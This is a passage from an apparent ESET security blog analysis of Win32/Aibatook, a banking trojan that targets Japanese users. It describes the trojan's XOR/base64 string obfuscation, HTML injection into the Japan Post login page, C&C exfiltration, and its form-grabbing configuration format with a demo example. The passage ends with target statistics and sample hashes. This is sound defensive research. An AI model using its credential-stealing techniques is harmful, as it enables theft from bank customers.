<li>The first one is a fixed-length key that looks like a <b><span style="font-family: 'courier new', courier;">base64</span> </b>encoded string, but that is actually just random <b><span style="font-family: 'courier new', courier;">base64</span> </b>characters. Before being used, this key will be <strong><span style="font-family: courier new,courier;">XOR</span></strong>-ed with a hardcoded value.</li>
<li>The second part contains the encrypted data that will be <span style="font-family: courier new,courier;"><b>base64</b></span> decoded first, and then <strong><span style="font-family: courier new,courier;">XOR</span></strong>-ed with the previous key.</li>
</ul>
<p>In case it is one of the targeted banks&#8217; URLs, the malicious program will monitor the user login process based on the title of the page (“<span style="font-family: courier new,courier;">IHTMLDocument2.get_title</span>”) and its content (“<span style="font-family: courier new,courier;">IHTMLDocument2.get_nameProp</span>”). During this login process, Win32/Aibatook can do two things:</p>
<ol>
<li>Retrieve values entered by the user in certain HTML input fields (login, password, and so forth.)</li>
<li>Rewrite HTML code displayed to the user by requesting the body of the HTML page (“<span style="font-family: 'courier new', courier;">IHTMLDocument2.get_body</span>”) and modifying it (“<span style="font-family: 'courier new', courier;">body.put_innerHTML</span>”). Here is an example of HTML code injected into the Japan Post bank login page:</li>
</ol>
<p><a href="/wp-content/uploads/2014/07/4_nice_aibatook_screen.png"><img class="aligncenter wp-image-47786" src="/wp-content/uploads/2014/07/4_nice_aibatook_screen.png" alt="Banking malware aibatook 4" width="600" height="381" srcset="https://www.welivesecurity.com/wp-content/uploads/2014/07/4_nice_aibatook_screen.png 679w, https://www.welivesecurity.com/wp-content/uploads/2014/07/4_nice_aibatook_screen-300x190.png 300w, https://www.welivesecurity.com/wp-content/uploads/2014/07/4_nice_aibatook_screen-65x42.png 65w" sizes="(max-width: 600px) 100vw, 600px" /></a>The red message roughly translates as an urgent request for the user to type in their personal identification number, because a system upgrade is necessary (clicking on the button just redirects to another page on the Japan Post website). Once personal information has been gathered, the program sends it to the C&amp;C server using a hardcoded URL. This message is a HTTP <b>POST</b> request containing the grabbed information as parameters, encrypted in a similar manner as the strings previously mentioned. It also sends the MAC address of the machine, probably to identify the victim. Among the two targeted banks with this method, Japan Post – targeted by Win32/Aibatook since the beginning – receives special treatment:</p>
<ul>
<li>A malicious proxy is set in the web browser when the user visits the Japan Post website. We were unable to observe the usage of this proxy, but we can guess it is another way to collect the information entered by the user.</li>
<li>If the user visits an anti-phishing webpage on the Japan Post website, Win32/Aibatook redirects to the login page before the anti-phishing webpage can be loaded.</li>
</ul>
<h3><b>Generic Information Stealer</b></h3>
<p>Last April, an additional information-stealing technique appeared in Win32/Aibatook. It allows attackers to extend the number of targets greatly without too much effort, even targeting non-banking websites. During the last few months this technique has been refined and seems recently to have reached a satisfying level – at least from the Win32/Aibatook authors’ point-of-view – as they are now only modifying the content and not the capabilities of the configuration engine.</p>
<p>This technique, commonly named &#8216;form-grabbing&#8217;, consists of constantly monitoring HTML input fields in webpages browsed by the user. In case these input fields match certain conditions, their filled values will then be exfiltrated. In order to so, a configuration file describing the target websites is fetched from a hardcoded URL. This file is initially encrypted in a similar manner to the strings described before, and will then be stored in memory in plain-text form. Here is an excerpt of one particular configuration file we found:</p>
<p style="text-align: left;"><span style="font-family: courier new,courier;">[VER]1000[/VER]<br />
</span><span style="font-family: 'courier new', courier;">[W]</span></p>
<p style="padding-left: 30px; text-align: left;"><span style="font-family: courier new,courier;">[Web]xy40[/Web]<br />
</span><span style="font-family: courier new,courier;">[CURL]REDACTED.jp[/CURL]</span><span style="font-family: courier new,courier;"><br />
[CTI][/CTI]</span><span style="font-family: courier new,courier;"><br />
[NAME]memberid[/NAME]</span><span style="font-family: courier new,courier;"><br />
[NAME]password[/NAME]</span><span style="font-family: courier new,courier;"><br />
[NAME]domain[/NAME]</span></p>
<p style="text-align: left;"><span style="font-family: courier new,courier;">[/W]<br />
</span><span style="font-family: courier new,courier;">[W]</span><span style="font-family: courier new,courier;"><br />
…<br />
</span><span style="font-family: courier new,courier;">[/W]</span></p>
<p>It&#8217;s a structured file with hierarchical tags similar to HTML language, except that tags are enclosed in brackets. It starts with a version tag, followed by a series of “<span style="font-family: courier new,courier;">[W]</span>” entries, each of them representing a target and containing multiple sub-entries:</p>
<ul>
<li>“<span style="font-family: courier new,courier;">[Web]</span>” tag contains the target’s name, which is usually set to some kind of code name with no apparent meaning</li>
<li>“<span style="font-family: courier new,courier;">[CURL]</span>” tag contains the target webpage’s URL (target’s URL has been removed from the previous image)</li>
<li>“<span style="font-family: courier new,courier;">[CTI]</span>&#8221; tag contains the target webpage’s title</li>
<li>”<span style="font-family: courier new,courier;">[NAME]</span>” tag defines an HTML input field’s name that will be leaked</li>
<li>“<span style="font-family: courier new,courier;">[ID]</span>” tag defines an HTML input field’s ID that will be leaked</li>
</ul>
<p>The logic followed by the program with this configuration file is the following: if a website’s URL matches the “<span style="font-family: courier new,courier;">[CURL]</span>” tag value of one entry, <b>or</b> its title matches the “<span style="font-family: courier new,courier;">[CTI]</span>” value tag, <b>then </b>each HTML input field that matches either “<span style="font-family: courier new,courier;">[NAME]</span>” or “<span style="font-family: courier new,courier;">[ID]</span>” tag values will be exfiltrated. To make it clear, let’s take a look at an artificial example:</p>
<table style="border: 1px solid;">
<tbody>
<tr>
<td style="border: 1px solid; text-align: center;">Win32/Aibatook configuration</td>
<td style="border: 1px solid; text-align: center;">Page visited by the user at the URL <span style="font-family: 'courier new', courier;">http://my_bank.demo/login/</span> <span style="font-family: 'courier new', courier;"> step2.html</span></td>
<td style="border: 1px solid; text-align: center;">Exfiltrated data when the user has filled the input fields with the values “<span style="font-family: 'courier new', courier;">MY_NAME</span>” and “<span style="font-family: 'courier new', courier;">SECRET_PASSWORD</span>”</td>
</tr>
<tr>
<td style="border: 1px solid; text-align: center;">
<p style="text-align: left;"><span style="font-family: 'courier new', courier;">[W] </span></p>
<p style="text-align: left; padding-left: 30px;"><span style="font-family: courier new,courier;">[Web]</span><span style="font-family: courier new,courier;"> CONFIG_DEMO</span><span style="font-family: courier new,courier;"> [/Web]</span><span style="font-family: courier new,courier;"> [CURL][/CURL]</span><span style="font-family: courier new,courier;"> [CTI][/CTI]</span><span style="font-family: courier new,courier;"> [NAME]</span><span style="font-family: courier new,courier;"> user_name</span><span style="font-family: courier new,courier;"> [/NAME]</span><span style="font-family: courier new,courier;"> [ID]</span><span style="font-family: courier new,courier;"> user_password</span><span style="font-family: courier new,courier;"> [/ID]</span></p>
<p style="text-align: left;"><span style="font-family: courier new,courier;">[/W]</span></p>
</td>
<td style="border: 1px solid; text-align: left;"><span style="font-family: 'courier new', courier;">&lt;html&gt; &lt;title&gt;STEP 2&lt;/title&gt; &lt;form&gt; User name: &lt;input type=&#8221;text&#8221; name=&#8221;user_name&#8221;&gt; Password: &lt;input type=&#8221;text&#8221; id=&#8221;user_password&#8221;&gt; &lt;/form&gt; &lt;/html&gt;</span></td>
<td style="border: 1px solid;"><span style="font-family: 'courier new', courier;">[WEB]CONFIG_DEMO[/WEB]</span> <span style="font-family: 'courier new', courier;">[TITLE]STEP 2[/TITLE]</span> <span style="font-family: 'courier new', courier;">[URL]http://my_bank.demo/</span> <span style="font-family: 'courier new', courier;">login/step2.html[/URL]</span> <span style="font-family: 'courier new', courier;">[NAME=user_name]MY_NAME</span> <span style="font-family: 'courier new', courier;">[/NAME]</span> <span style="font-family: 'courier new', courier;">[ID=user_password]</span> <span style="font-family: 'courier new', courier;">SECRET_PASSWORD[/ID]</span></td>
</tr>
</tbody>
</table>
<p>In this example we have, from left to right, a Win32/Aibatook’s configuration file with one entry, then a visited webpage that will trigger this entry, and finally the information sent to the exfiltration server. This information-stealing technique is highly flexible; in particular some entries come with empty values for “<span style="font-family: courier new,courier;">[CURL]</span>” and “<span style="font-family: courier new,courier;">[CTI]</span>” tags, making any webpage with the corresponding HTML input fields a match. In terms of targets, we found<b> 87 </b>of them during our investigation. We were able to identify some of them, based on the “<span style="font-family: 'courier new', courier;">[CURL]</span>” and “<span style="font-family: courier new,courier;">[CTI]</span>” tags values, whereas the others remain unidentified. The domains of activity of these targets are described below:</p>
<table style="border: 1px solid width:70%; margin-left: 15%; margin-right: 15%;">
<tbody>
<tr>
<td style="border: 1px solid; text-align: center;"><strong>Domains of activity</strong></td>
<td style="border: 1px solid; text-align: center;"><strong>Number of targets</strong></td>
</tr>
<tr>
<td style="border: 1px solid; text-align: center;">Bank</td>
<td style="border: 1px solid; text-align: center;">23</td>
</tr>
<tr>
<td style="border: 1px solid; text-align: center;">Hosting Provider</td>
<td style="border: 1px solid; text-align: center;">5</td>
</tr>
<tr>
<td style="border: 1px solid; text-align: center;">Domain reseller</td>
<td style="border: 1px solid; text-align: center;">1</td>
</tr>
<tr>
<td style="border: 1px solid; text-align: center;">Unidentified</td>
<td style="border: 1px solid; text-align: center;">58</td>
</tr>
</tbody>
</table>
<p>As expected, the majority of the identified targets belong to the banking domain, but some of them are hosting companies, which could explain how legitimate websites are compromised and then used in the exploitation chain. It should be noted that the majority of the identified targets are important businesses in Japan.</p>
<h2><b>Conclusion</b><b></b></h2>
<p>In this blog post we have described Win32/Aibatook, a malware family targeting Japanese users. Computers become infected by this malware through a custom exploitation chain served by compromised legitimate websites. Its main purpose is to steal personal information through an unusual Internet Explorer monitoring technique. This technique implements two different information stealers, one specifically tailored against a few major Japanese banks, and a second one targeting around 90 different websites.</p>
<p>Based on our observations during this investigation, Win32/Aibatook has been constantly developed over the past few months. We believe that this malware family is now ready for take-off, and we expect its authors to spread it more broadly in the near future.</p>
<p><i>This analysis was created by Clément Rouault, in collaboration with Joan Calvet.</i></p>
<h2><b>Hashes</b></h2>
<p>Here are some SHA-1 hashes of Win32/Aibatook samples:</p>
<p><span style="font-family: courier new,courier;">c5ffed550addfa27dc1adbc58f3f99fa9a5bc9e8<br />
</span><span style="font-family: courier new,courier;">ebd4fd477bd8a93bfb24fd49128860e8d2b494e0<br />
</span><span style="font-family: courier new,courier;">3e90dde02423687b7c81cba8fc600f7cbcda8752</span><span style="font-family: courier new,courier;"><br />
4343919ba7c2701f5481632f20bf7ddc2c6ebe11</span></p>

                            
                                                            <div class="dot">
                                    <span class="icomoon icon-icon_article_dot"></span>
                                </div>

                                <div class="meta">
                                    <div class="wls-authors wls-authors-footer">
                                                                            </div>
                                    <span class="strong">
								        <time datetime="2014-07-16 11:41:29">16 Jul 2014 - 11:41AM</time>
                                    </span>
                                </div>
                            
                                <div class="widgets row">
        <div class="col-md-12 col-sm-12 col-xs-12">
            <div class="heading-line col-md-12 col-sm-12 col-xs-12 no-padding">
                <h3><span class="text"><em>Sign up to receive an email update whenever a new article is published in our <a href="https://www.welivesecurity.com/category/ukraine-crisis-digital-security-resource-center/" target="_blank" rel="noopener">Ukraine Crisis – Digital Security Resource Center</a></em></span></h3>
            </div>
        </div>
        <div class="col-md-6 col-sm-6 col-xs-12 newsletter-wrapper">
            <form action="https://enjoy.eset.com/pub/rf" class="basic-searchform col-md-12 col-sm-12 col-xs-12 no-padding newsletter" method="post" role="search">
                <div class="search-input clearfix">
                    <input type="text" name="EMAIL_ADDRESS_" value="" placeholder="Email...">
                    <input type="hidden" name="TOPIC" value="We Live Security Ukraine Newsletter">

                    <input type="hidden" name="_ri_" value="X0Gzc2X%3DAQpglLjHJlTQGgXv4jDGEK4KW2uhw0qgUzfwuivmOJOPCgzgo9vsI3VwjpnpgHlpgneHmgJoXX0Gzc2X%3DAQpglLjHJlTQGzbD6yU2pAgzaJM16bkTA7tOwuivmOJOPCgzgo9vsI3">
                    <input type="hidden" name="_ei_" value="Ep2VKa8UKNIAPP_2GAEW0bY">
                    <input type="hidden" name="_di_" value="m0a5n0j02duo9clmm4btuu5av8rdtvqfqd03v1hallrvcob47ad0">
                    <input type="hidden" name="EMAIL_PERMISSION_STATUS_" value="O">
                    <input type="hidden" name="CONTACT_SOURCE_MOST_RECENT" value="WLS_Subscribe_Form">
                    <button class="button-flag">
                        Submit                    </button>
                </div>
            </form>
        </div>
    </div>
                                <div class="widgets row">
        <div class="col-md-12 col-sm-12 col-xs-12">
            <div class="heading-line col-md-12 col-sm-12 col-xs-12 no-padding">
                <h3><span class="text">Newsletter</span></h3>
            </div>
        </div>
        <div class="col-md-6 col-sm-6 col-xs-12 newsletter-wrapper">
            <form action="https://enjoy.eset.com/pub/rf" class="basic-searchform col-md-12 col-sm-12 col-xs-12 no-padding newsletter" method="post" role="search">
                <div class="search-input clearfix">
                    <input type="text" name="EMAIL_ADDRESS_" value="" placeholder="Email...">
                    <input type="hidden" name="NEWSLETTER" value="We Live Security">

                    <input type="hidden" name="_ri_" value="X0Gzc2X%3DAQpglLjHJlTQGgXv4jDGEK4KW2uhw0qgUzfwuivmOJOPCgzgo9vsI3VwjpnpgHlpgneHmgJoXX0Gzc2X%3DAQpglLjHJlTQGzbD6yU2pAgzaJM16bkTA7tOwuivmOJOPCgzgo9vsI3">
                    <input type="hidden" name="_ei_" value="Ep2VKa8UKNIAPP_2GAEW0bY">
                    <input type="hidden" name="_di_" value="m0a5n0j02duo9clmm4btuu5av8rdtvqfqd03v1hallrvcob47ad0">
                    <input type="hidden" name="EMAIL_PERMISSION_STATUS_" value="O">
                    <input type="hidden" name="CONTACT_SOURCE_MOST_RECENT" value="WLS_Subscribe_Form">
                    <button class="">
                        Submit                    </button>
                </div>
            </form>
        </div>
    </div>

                                                            <div class="similar-articles row">
                                    <div class="heading-line col-md-12 col-sm-12 col-xs-12">
                                        <h3><span class="text">Similar Articles</span></h3>
                                    </div>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/cybercrime/" class="category-tag-btn">Cybercrime</a>                                                <a href="https://www.welivesecurity.com/2022/06/27/5-ways-cybercriminals-steal-credit-card-details/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2022/06/credit-card-theft-hackers-623x415.jpg"
                                                         alt="Win32/Aibatook: Banking Trojan Spreading Through Japanese Adult Websites">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2022/06/27/5-ways-cybercriminals-steal-credit-card-details/">
                                                    5 ways cybercriminals steal credit card details                                                </a>
                                            </h4>
                                        </article>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/malware/" class="category-tag-btn">Malware</a>                                                <a href="https://www.welivesecurity.com/2022/06/16/how-emotet-is-changing-tactics-microsoft-tightening-office-macro-security/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2022/06/emotet-malware-botnet-macros-mark-web-623x415.jpg"
                                                         alt="Win32/Aibatook: Banking Trojan Spreading Through Japanese Adult Websites">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2022/06/16/how-emotet-is-changing-tactics-microsoft-tightening-office-macro-security/">
                                                    How Emotet is changing tactics in response to Microsoft’s tightening of Office macro security                                                </a>
                                            </h4>
                                        </article>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/cybercrime/" class="category-tag-btn">Cybercrime</a>                                                <a href="https://www.welivesecurity.com/2022/04/05/were-going-on-tor/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2022/04/tor-dark-web-illegal-services-623x415.jpg"
                                                         alt="Win32/Aibatook: Banking Trojan Spreading Through Japanese Adult Websites">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2022/04/05/were-going-on-tor/">
                                                    We’re going on Tor                                                </a>
                                            </h4>
                                        </article>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/cybercrime/" class="category-tag-btn">Cybercrime</a>                                                <a href="https://www.welivesecurity.com/2022/02/10/hidden-plain-sight-dark-web-spilling-social-media/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2022/02/dark-web-social-media-cyber-crime-623x432.jpg"
                                                         alt="Win32/Aibatook: Banking Trojan Spreading Through Japanese Adult Websites">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2022/02/10/hidden-plain-sight-dark-web-spilling-social-media/">
                                                    Hidden in plain sight: How the dark web is spilling onto social media                                                </a>
                                            </h4>
                                        </article>
                                                                    </div>
                            
                            <div class="comments row">
                                <div class="heading-line col-xs-12">
                                    <h3><span class="text">Discussion</span></h3>
                                                                            
<div id="disqus_thread"></div>
                                                                    </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
    	</div> 	<footer id="site-footer">
		<div class="container">
			<div class="row">
				<div class="col-md-2">
                    <div class="hidden-sm hidden-xs">
                        <div class="logo-wrapper footer clearfix">
                            <div class="dark clearfix">
                                <a href="https://www.welivesecurity.com/" class="wls">
                                    <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-footer-1.svg" alt="Welivesecurity.com">
                                </a>
                                <a href="https://www.eset.com" class="eset">
                                    <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-footer-2.svg" alt="by ESET">
                                </a>
                            </div>
                        </div>
                    </div>
                    <div class="hidden-lg hidden-md">
                        <div class="logo-wrapper clearfix">
    <div class="dark clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-2.svg" alt="by ESET">
        </a>
    </div>
    <div class="light clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-2.svg" alt="by ESET">
        </a>
    </div>
</div>                    </div>
				</div>
				<nav id="footer" class="clearfix">
											<div class="mobile-block">
																<div class="col-md-2 col-md-offset-2">
										<ul>
																							<li>
													<a href="/">Home</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/about-us/">About Us</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/contact-us/">Contact Us</a>
												</li>
																					</ul>
									</div>
																<div class="col-md-2 ">
										<ul>
																							<li>
													<a href="https://www.welivesecurity.com/sitemap/">Sitemap</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/our-experts/">Our Experts</a>
												</li>
																							<li>
													<a href="https://eset.com">ESET</a>
												</li>
																					</ul>
									</div>
													</div>
											<div class="mobile-block">
																<div class="col-md-2 ">
										<ul>
																							<li>
													<a href="https://www.welivesecurity.com/research/">Research</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/category/how-to/">How To</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/categories/">Categories</a>
												</li>
																					</ul>
									</div>
																<div class="col-md-2 ">
										<ul>
																							<li>
													<a href="https://www.welivesecurity.com/rss-configurator/">RSS Configurator</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/news-widget-generator/">News Widget</a>
												</li>
																					</ul>
									</div>
													</div>
									</nav>
			</div>
			<div class="row">
				<div class="col-md-12 legal clearfix">
					<div class="wrap clearfix">
													<span>
								<a href="https://www.welivesecurity.com/privacy/">
									Privacy Policy								</a>
							</span>
													<span>
								<a href="https://www.welivesecurity.com/legal-information/">
									Legal Information								</a>
							</span>
											</div>
					<span class="copyright pull-right">Copyright &copy; ESET, All Rights Reserved</span>
				</div>
							</div>
		</div>
	</footer>
	
	<button id="back-to-top" class="animated-scroll" data-target="absoluteTop">
		<span class="icomoon icon-icon_arrow"></span>
		<span class="text">Back to top</span>
	</button>

			<div class="social-wrapper-mobile hidden-lg hidden-md hidden-sm" id="mobile-article-sharer">
			<div class="col-xs-12">
				<div class="icons" style="text-align: center;">
											<a class="share-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.welivesecurity.com%2F2014%2F07%2F16%2Fwin32aibatook%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Facebook">
							<span class="icomoon icon-icon_fb"></span>
						</a>
											<a class="share-twitter" href="https://twitter.com/intent/tweet?https%3A%2F%2Fwww.welivesecurity.com%2F2014%2F07%2F16%2Fwin32aibatook%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Twitter">
							<span class="icomoon icon-icon_tw"></span>
						</a>
											<a class="share-linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fwww.welivesecurity.com%2F2014%2F07%2F16%2Fwin32aibatook%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Linkedin">
							<span class="icomoon icon-icon_in"></span>
						</a>
									</div>
			</div>
		</div>
	
	<script>
		var baseUrl = "https://www.welivesecurity.com/";
	</script>
	
			<script>
            !function(){if(-1==window.document.cookie.indexOf("user_rec=1")){function e(e,o){var t=document.createElement("img");t.setAttribute("style","display:none"),t.src=e+o,window.document.body.appendChild(t)}function o(){d||Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=Default%20status&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=defaultStatus&z="+Math.floor(1e6*Math.random(0,1)),e(u,a),e(s,c)}function t(){console.log("GA and GTM are loaded."),d=ga.getAll()[0].get("clientId"),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20loaded,%20GTM%20loaded&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=11",e(u,a),e(s,c)}function n(){var e=new Date;e.setTime(e.getTime()+63072e6);var o="expires="+e.toUTCString();window.document.cookie="user_rec=1; "+o+"; path=/"}var d,a,c,i,r,l="UA-76266002-27",g=window.location.href,s="https://cdn1.esetstatic.com/ESET/INT/assets/img/check.png",u="https://www.google-analytics.com/collect",w="wls",m=0,h=function e(){i=window.ga&&ga.create?1:0,r=window.google_tag_manager?1:0,m++,console.log("Timer: ",m),h=setTimeout(e,500)};window.document.addEventListener&&(d=1e6*Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=Script%20loaded&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=scriptLoaded&z="+Math.floor(1e6*Math.random(0,1)),e(u,a),e(s,c),window.addEventListener("beforeunload",o),window.ga&&ga.create&&window.google_tag_manager?(t(),window.removeEventListener("beforeunload",o),n()):(setTimeout(h,500),setTimeout(function(){clearTimeout(h),i&&r?t():i&&!r?(console.log("GA is loaded and GTM is blocked."),d=ga.getAll()[0].get("clientId"),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20loaded,%20GTM%20blocked&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=10",e(u,a),e(s,c)):!i&&r?(console.log("GA is blocked and GTM is loaded."),d||Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20blocked,%20GTM%20loaded&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=01",e(u,a),e(s,c)):i||r||(console.log("GA is blocked and GTM is blocked."),d||Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20blocked,%20GTM%20blocked&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=00",e(u,a),e(s,c)),window.removeEventListener("beforeunload",o),n()},1e4)))}}();
		</script>
	
	<script src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/js/main.js?id=fef3139dcedd23afc232"></script>
    <!-- Version: v1.10.0.0df103.pro.azeu -->
    		<script type="text/javascript">
			var disqus_config = function () { 
				this.language = "en";
			};
			var CrayonSyntaxSettings = {"version":"_2.7.2_beta","is_admin":"0","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":"", "numsVisible": false};
			var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
		</script>
		<script src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/static/js/crayon.min.js"></script>

			
		
    <script>
    	Main.init();
    </script>

    <script type='text/javascript'>
/* <![CDATA[ */
var countVars = {"disqusShortname":"welivesecurity"};
/* ]]> */
</script>
<script type='text/javascript' src='https://www.welivesecurity.com/wp-content/plugins/disqus-comment-system/public/js/comment_count.js?ver=3.0.16'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var embedVars = {"disqusConfig":{"integration":"wordpress 3.0.16"},"disqusIdentifier":"47775 \/?p=47775","disqusShortname":"welivesecurity","disqusTitle":"Win32\/Aibatook: Banking Trojan Spreading Through Japanese Adult Websites","disqusUrl":"https:\/\/www.welivesecurity.com\/2014\/07\/16\/win32aibatook\/","postId":"47775"};
/* ]]> */
</script>
<script type='text/javascript' src='https://www.welivesecurity.com/wp-content/plugins/disqus-comment-system/public/js/comment_embed.js?ver=3.0.16'></script>
    <script src="https://assets.esetstatic.com/3PR/app.min.js"></script>
  </body>
</html>
